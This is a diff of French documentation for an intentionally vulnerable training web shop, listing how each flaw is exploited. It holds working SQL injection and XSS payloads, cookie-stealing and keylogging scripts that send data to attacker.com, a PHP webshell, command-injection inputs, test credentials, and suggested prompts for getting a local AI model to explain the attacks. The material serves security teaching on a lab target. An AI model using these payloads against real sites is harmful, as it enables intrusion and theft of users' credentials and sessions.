@@ -1,335 +1,338 @@
-# VulnShop - Documentation des Vulnérabilités
+# Documentation des Vulnérabilités - TechStore
 
-> **ATTENTION**: Ce site est intentionnellement vulnérable à des fins éducatives.
-> Ne JAMAIS déployer ce code en production ou sur un serveur accessible publiquement.
-
-## Table des Matières
-
-1. [SQL Injection](#1-sql-injection)
-2. [Cross-Site Scripting (XSS)](#2-cross-site-scripting-xss)
-3. [Broken Access Control / IDOR](#3-broken-access-control--idor)
-4. [Privilege Escalation](#4-privilege-escalation)
-5. [Insecure File Upload](#5-insecure-file-upload)
-6. [Weak Password Storage](#6-weak-password-storage)
-7. [Information Disclosure](#7-information-disclosure)
-8. [Missing CSRF Protection](#8-missing-csrf-protection)
-9. [Command Injection](#9-command-injection)
+> Site e-commerce volontairement vulnérable à des fins pédagogiques
 
 ---
 
-## 1. SQL Injection
+## Comptes de test
 
-### Localisation: `login.php`
-**Type**: Authentication Bypass
+| Username | Password | Rôle | Note |
+|----------|----------|------|------|
+| `admin` | `admin123` | Admin | Hash MD5 |
+| `user1` | `password` | User | Hash MD5 |
+| `test` | `motdepasse123` | User | **EN CLAIR** (visible avec UNION) |
 
-```sql
--- Payload pour bypass login:
-Username: admin' OR '1'='1' --
-Password: anything
+---
 
--- Ou encore:
-Username: admin'--
-Password: anything
-```
+## 1. SQL Injection - Bypass Login
 
-**Fichier**: `login.php:22`
+**Page:** `login.php`
+
+**Vulnérabilité:** La requête SQL utilise une concaténation directe sans échappement.
+
 ```php
 $query = "SELECT * FROM users WHERE username='$username' AND password=MD5('$password')";
 ```
 
-### Localisation: `products.php`
-**Type**: Data Extraction via UNION
+### Attaques
 
+| Username | Password | Résultat |
+|----------|----------|----------|
+| `admin'#` | test | Connecté en admin |
+| `' OR 1=1#` | test | Connecté en premier user (admin) |
+| `user1'#` | test | Connecté en user1 |
+| `' OR '1'='1'#` | test | Connecté en admin |
+
+### Explication
+
+Avec `admin'#`, la requête devient:
 ```sql
--- Dans le champ recherche:
-' UNION SELECT 1,username,password,4,5,6,7 FROM users--
-
--- Pour extraire la structure:
-' UNION SELECT 1,table_name,3,4,5,6,7 FROM information_schema.tables WHERE table_schema=database()--
+SELECT * FROM users WHERE username='admin'#' AND password=MD5('test')
 ```
-
-**Fichier**: `products.php:18-26`
-
-### Localisation: `product.php`
-**Type**: SQL Injection via ID
-
-```
-URL: product.php?id=1 OR 1=1
-URL: product.php?id=1 UNION SELECT 1,2,3,4,5,6,7
-```
-
-**Fichier**: `product.php:14`
-
-### Localisation: `orders.php`
-**Type**: SQL Injection + IDOR
-
-```
-URL: orders.php?order_id=1 OR 1=1
-```
+Le `#` commente le reste, donc seul le username est vérifié.
 
 ---
 
-## 2. Cross-Site Scripting (XSS)
+## 2. SQL Injection - Afficher tous les produits
 
-### XSS Réfléchi - `products.php`
-**Localisation**: Paramètre de recherche
+**Page:** `products.php`
 
-```html
-<!-- Payload dans l'URL -->
-products.php?search=<script>alert('XSS')</script>
+**Vulnérabilité:** Le paramètre de recherche est injecté directement.
 
-<!-- Vol de cookies -->
-products.php?search=<script>document.location='http://attacker.com/?c='+document.cookie</script>
-
-<!-- Injection d'image -->
-products.php?search=<img src=x onerror="alert('XSS')">
+```php
+$query .= " AND name = '$search'";
 ```
 
-**Fichier**: `products.php:64`
+### Attaque
 
-### XSS Stocké - `product.php`
-**Localisation**: Commentaires produits
+| Recherche | Résultat |
+|-----------|----------|
+| `' OR '1'='1` | Affiche tous les produits |
 
-```html
-<!-- Dans le formulaire de commentaire -->
-<script>alert('Stored XSS')</script>
+### Explication
 
-<!-- Keylogger -->
-<script>document.onkeypress=function(e){new Image().src='http://attacker.com/log?k='+e.key}</script>
-
-<!-- Session Hijacking -->
-<script>fetch('http://attacker.com/steal?cookie='+document.cookie)</script>
+La requête devient:
+```sql
+SELECT * FROM products WHERE 1=1 AND name = '' OR '1'='1' ORDER BY name
 ```
-
-**Fichier**: `product.php:86`
+La condition `'1'='1'` est toujours vraie.
 
 ---
 
-## 3. Broken Access Control / IDOR
+## 3. SQL Injection - Extraire les mots de passe (UNION)
 
-### Localisation: `orders.php`
-**Type**: Insecure Direct Object Reference
+**Page:** `products.php`
 
-Un utilisateur connecté peut accéder aux commandes d'autres utilisateurs:
+### Attaques
 
-```
-# Étant connecté en tant que user1, accéder aux commandes de user2:
-orders.php?order_id=1
-orders.php?order_id=2
-orders.php?order_id=3
-```
+| Recherche | Résultat |
+|-----------|----------|
+| `' UNION SELECT 1,username,3,4,5,6,password FROM users#` | Affiche username + password |
+| `' UNION SELECT 1,CONCAT(username,':',password),3,4,5,6,7 FROM users#` | Affiche username:password |
+| `' UNION SELECT 1,username,3,4,5,6,email FROM users#` | Affiche username + email |
 
-**Fichier**: `orders.php:20-26`
-- Pas de vérification que `order_id` appartient à `user_id`
+### Ce que tu vois
+
+Les utilisateurs s'affichent comme des "produits":
+- **Nom du produit** = username
+- **Catégorie** = password (ou email)
+
+**Important:** L'utilisateur `test` a son mot de passe `motdepasse123` visible en clair!
 
 ---
 
-## 4. Privilege Escalation
+## 4. SQL Injection - Lister les tables
 
-### Méthode 1: Cookie Tampering - `admin/dashboard.php`
+**Page:** `products.php`
 
+### Attaque
+
+```
+' UNION SELECT 1,table_name,3,4,5,6,7 FROM information_schema.tables WHERE table_schema=database()#
+```
+
+### Résultat
+
+Affiche toutes les tables: users, products, orders, comments
+
+---
+
+## 5. SQL Injection - URL Produit
+
+**Page:** `product.php?id=X`
+
+**Vulnérabilité:** L'ID n'est pas validé.
+
+```php
+$query = "SELECT * FROM products WHERE id = $id";
+```
+
+### Attaques
+
+| URL | Résultat |
+|-----|----------|
+| `product.php?id=1 OR 1=1` | Affiche le premier produit |
+| `product.php?id=0 UNION SELECT 1,username,password,4,5,6,7 FROM users` | Affiche user/password |
+
+---
+
+## 6. XSS Réfléchi
+
+**Page:** `products.php`
+
+**Vulnérabilité:** Le terme de recherche est affiché sans échappement.
+
+```php
+<p>Résultats pour: <strong><?php echo $search; ?></strong></p>
+```
+
+### Attaques
+
+| Recherche | Résultat |
+|-----------|----------|
+| `<script>alert(1)</script>` | Popup "1" |
+| `<script>alert('XSS')</script>` | Popup "XSS" |
+| `<script>alert(document.cookie)</script>` | Affiche les cookies |
+| `<img src=x onerror=alert(1)>` | Popup "1" |
+| `<svg onload=alert(1)>` | Popup "1" |
+
+---
+
+## 7. XSS Stocké (Commentaires)
+
+**Page:** `product.php?id=1`
+
+**Prérequis:** Être connecté
+
+**Vulnérabilité:** Les commentaires sont affichés sans échappement.
+
+```php
+<div class="comment-content"><?php echo $comment['content']; ?></div>
+```
+
+### Attaques
+
+Dans le champ commentaire:
+
+| Commentaire | Résultat |
+|-------------|----------|
+| `<script>alert('XSS')</script>` | Popup pour TOUS les visiteurs |
+| `<script>alert(document.cookie)</script>` | Vol de cookies |
+
+---
+
+## 8. IDOR - Accès aux commandes
+
+**Page:** `orders.php`
+
+**Prérequis:** Être connecté (user1/password)
+
+**Vulnérabilité:** Pas de vérification que la commande appartient à l'utilisateur.
+
+```php
+$detail_query = "SELECT * FROM orders WHERE id = $order_id";
+```
+
+### Attaques
+
+| URL | Résultat |
+|-----|----------|
+| `orders.php?order_id=1` | Commande de admin (adresse: 1 Rue Admin, Paris - CODE: 1234) |
+| `orders.php?order_id=2` | Commande de user1 (adresse: 15 Avenue User, Lyon - DIGICODE: 5678) |
+| `orders.php?order_id=3` | Commande de test |
+
+**Données sensibles visibles:** Adresses, codes de porte, digicodes
+
+---
+
+## 9. Élévation de privilèges - Mass Assignment
+
+**Page:** `profile.php`
+
+**Prérequis:** Être connecté (user1/password)
+
+**Vulnérabilité:** Tous les champs POST sont acceptés, y compris `role`.
+
+```php
+foreach ($_POST as $key => $value) {
+    $updates[] = "$key = '$value'";
+}
+```
+
+### Attaque
+
+1. Va sur `profile.php`
+2. Ouvre **F12** (DevTools)
+3. Va dans **Console**
+4. Tape:
 ```javascript
-// Dans la console navigateur:
-document.cookie = "role=admin; path=/";
-// Puis accéder à /admin/dashboard.php
+document.querySelector('input[name="role"]').value='admin';
 ```
+5. Clique sur **"Mettre à jour"**
 
-**Fichier**: `admin/dashboard.php:14-18`
+### Résultat
 
-### Méthode 2: Mass Assignment - `profile.php`
-
-```html
-<!-- Modifier le champ caché via DevTools -->
-<input type="hidden" name="role" value="admin">
-
-<!-- Ou via curl/Burp Suite -->
-POST /profile.php
-Content-Type: application/x-www-form-urlencoded
-
-username=user1&email=user1@test.com&role=admin
-```
-
-**Fichier**: `profile.php:20-25`
-
-### Méthode 3: Cookie Remember Me - `login.php`
-
-```javascript
-// Après connexion avec "Remember me":
-document.cookie = "user_id=1; path=/";  // ID admin
-document.cookie = "role=admin; path=/";
-```
-
-**Fichier**: `login.php:33-36`
+Tu deviens admin. Le lien "Admin" apparaît dans le menu.
 
 ---
 
-## 5. Insecure File Upload
+## 10. Cookie Tampering - Accès Admin
 
-### Localisation: `profile.php`
-**Type**: Unrestricted File Upload
+**Page:** N'importe quelle page
 
-```bash
-# Upload d'un webshell PHP
-# 1. Créer un fichier: shell.php
+**Vulnérabilité:** Le rôle est vérifié via cookie non signé.
+
+```php
+if (isset($_COOKIE['role']) && $_COOKIE['role'] == 'admin') {
+    $is_admin = true;
+}
+```
+
+### Attaque
+
+1. Ouvre **F12** (DevTools)
+2. Va dans **Console**
+3. Tape:
+```javascript
+document.cookie="role=admin; path=/";
+```
+4. Va sur `admin/dashboard.php`
+
+### Résultat
+
+Accès au panel admin sans être connecté.
+
+---
+
+## 11. File Upload - Webshell
+
+**Page:** `profile.php`
+
+**Prérequis:** Être connecté
+
+**Vulnérabilité:** Aucune validation du type de fichier uploadé.
+
+```php
+$filename = $_FILES['avatar']['name'];
+move_uploaded_file($_FILES['avatar']['tmp_name'], $upload_dir . $filename);
+```
+
+### Attaque
+
+1. Crée un fichier `shell.php`:
+```php
 <?php system($_GET['cmd']); ?>
-
-# 2. L'uploader comme "avatar"
-# 3. Accéder à: /uploads/avatars/shell.php?cmd=whoami
 ```
 
-**Fichier**: `profile.php:45-58`
-- Pas de validation du type MIME
-- Pas de restriction d'extension
-- Nom de fichier original conservé
+2. Va sur `profile.php`
+3. Upload ce fichier comme "Photo de profil"
+4. Accède à: `uploads/avatars/shell.php?cmd=dir`
+
+### Commandes possibles
+
+| URL | Résultat |
+|-----|----------|
+| `shell.php?cmd=dir` | Liste les fichiers |
+| `shell.php?cmd=whoami` | Utilisateur système |
+| `shell.php?cmd=type ..\config\database.php` | Lit la config BDD |
 
 ---
 
-## 6. Weak Password Storage
+## 12. Information Disclosure
 
-### Localisation: `register.php`, `login.php`
-**Type**: MD5 sans salt
+**Pages:** Toutes
 
-```php
-// Mots de passe stockés en MD5 (facilement cassables)
-$password_hash = md5($password);
-```
+**Vulnérabilité:** Les requêtes SQL sont affichées en commentaires HTML.
 
-**Mots de passe de test (hash MD5):**
-| User | Password | MD5 Hash |
-|------|----------|----------|
-| admin | admin123 | 0192023a7bbd73250516f069df18b500 |
-| user1 | password | 5f4dcc3b5aa765d61d8327deb882cf99 |
-| user2 | 123456 | e10adc3949ba59abbe56e057f20f883e |
+### Comment voir
 
-```bash
-# Cracker avec hashcat:
-hashcat -m 0 -a 0 hash.txt rockyou.txt
-```
+1. Fais une action sur le site
+2. Affiche le code source (Ctrl+U)
+3. Cherche `<!-- DEBUG:` ou `<!-- Query:`
 
 ---
 
-## 7. Information Disclosure
+## Tableau récapitulatif
 
-### Debug SQL visible - Multiples fichiers
-
-```html
-<!-- Commentaires HTML visibles dans le source -->
-<!-- DEBUG: SELECT * FROM users WHERE username='admin' -->
-<!-- Query: SELECT * FROM products WHERE... -->
-<!-- Erreur SQL: ... -->
-```
-
-**Fichiers concernés:**
-- `login.php:26`
-- `products.php:32`
-- `product.php:17`
-- `orders.php:25`
-- `profile.php:34`
-
-### Messages d'erreur détaillés - `login.php`
-
-```
-"L'utilisateur 'admin' n'existe pas"
-"Mot de passe incorrect pour 'admin'"
-```
-
-**Fichier**: `login.php:41-46`
-
----
-
-## 8. Missing CSRF Protection
-
-### Localisation: Tous les formulaires
-
-Aucun token CSRF n'est implémenté:
-
-```html
-<!-- Attaque CSRF - Forcer un commentaire -->
-<form action="http://localhost/vulnerable_shop/product.php?id=1" method="POST">
-    <input type="hidden" name="comment" value="Commentaire malveillant">
-    <input type="submit" value="Cliquez ici pour gagner!">
-</form>
-
-<!-- Auto-submit -->
-<body onload="document.forms[0].submit()">
-```
-
-**Fichiers sans CSRF:**
-- `product.php` (commentaires)
-- `profile.php` (modification profil)
-- `login.php` / `register.php`
-
----
-
-## 9. Command Injection
-
-### Localisation: `admin/dashboard.php`
-**Type**: OS Command Injection (simulé)
-
-```bash
-# Dans le champ backup:
-backup_name; cat /etc/passwd
-backup_name && whoami
-backup_name | ls -la
-backup_name`id`
-```
-
-**Fichier**: `admin/dashboard.php:30-35`
-```php
-$command = "mysqldump -u root vulnerable_shop > backups/" . $backup_name . ".sql";
-```
+| # | Vulnérabilité | Page | Payload |
+|---|---------------|------|---------|
+| 1 | SQLi Login | login.php | `admin'#` |
+| 2 | SQLi Produits | products.php | `' OR '1'='1` |
+| 3 | SQLi UNION | products.php | `' UNION SELECT 1,username,3,4,5,6,password FROM users#` |
+| 4 | SQLi Tables | products.php | `' UNION SELECT 1,table_name,3,4,5,6,7 FROM information_schema.tables WHERE table_schema=database()#` |
+| 5 | SQLi URL | product.php | `?id=1 OR 1=1` |
+| 6 | XSS Réfléchi | products.php | `<script>alert(1)</script>` |
+| 7 | XSS Stocké | product.php | Commentaire: `<script>alert(1)</script>` |
+| 8 | IDOR | orders.php | `?order_id=1` |
+| 9 | Privilege Escalation | profile.php | F12: `document.querySelector('input[name="role"]').value='admin'` |
+| 10 | Cookie Tampering | Console F12 | `document.cookie="role=admin; path=/"` |
+| 11 | File Upload | profile.php | Upload `shell.php` puis `?cmd=dir` |
+| 12 | Info Disclosure | Ctrl+U | Chercher `<!-- DEBUG:` |
 
 ---
 
 ## Utilisation avec Ollama/Llama3
 
-### Prompts suggérés pour votre IA locale:
-
-```
-1. "Analyse la page login.php et explique-moi comment exploiter une injection SQL pour contourner l'authentification"
-
-2. "Je suis sur products.php, comment puis-je extraire les mots de passe des utilisateurs via SQL injection?"
-
-3. "Explique-moi étape par étape comment réaliser une élévation de privilèges sur ce site"
-
-4. "Comment puis-je voler les cookies d'un administrateur via XSS stocké?"
-
-5. "Décris le processus complet pour uploader un webshell et obtenir un accès au serveur"
+```bash
+ollama run llama3
 ```
 
----
+### Exemple de prompt
 
-## Checklist d'Exploitation
+```
+Je teste un site e-commerce vulnérable en local. La page login.php contient:
 
-- [ ] SQL Injection - Bypass login
-- [ ] SQL Injection - Extraction de données (UNION)
-- [ ] XSS Réfléchi - Vol de session
-- [ ] XSS Stocké - Persistance
-- [ ] IDOR - Accès aux commandes
-- [ ] Privilege Escalation - Cookie tampering
-- [ ] Privilege Escalation - Mass Assignment
-- [ ] File Upload - Webshell
-- [ ] Password Cracking - MD5
-- [ ] Information Disclosure - Debug SQL
-- [ ] CSRF - Action non autorisée
-- [ ] Command Injection - RCE (simulé)
+$query = "SELECT * FROM users WHERE username='$username' AND password=MD5('$password')";
 
----
-
-## Remédiation (Pour information)
-
-| Vulnérabilité | Solution |
-|---------------|----------|
-| SQL Injection | Requêtes préparées (PDO/mysqli_prepare) |
-| XSS | htmlspecialchars(), Content-Security-Policy |
-| IDOR | Vérification d'appartenance des ressources |
-| Privilege Escalation | JWT signés, vérification côté serveur |
-| File Upload | Validation MIME, extension whitelist, stockage hors webroot |
-| Weak Password | bcrypt/Argon2 avec salt |
-| CSRF | Tokens CSRF par formulaire |
-| Command Injection | Éviter shell_exec, escapeshellarg() |
-
----
-
-**Auteur**: Projet éducatif cybersécurité
-**Usage**: Démonstration et formation uniquement
+Explique-moi comment exploiter cette injection SQL pour me connecter en admin.
+```
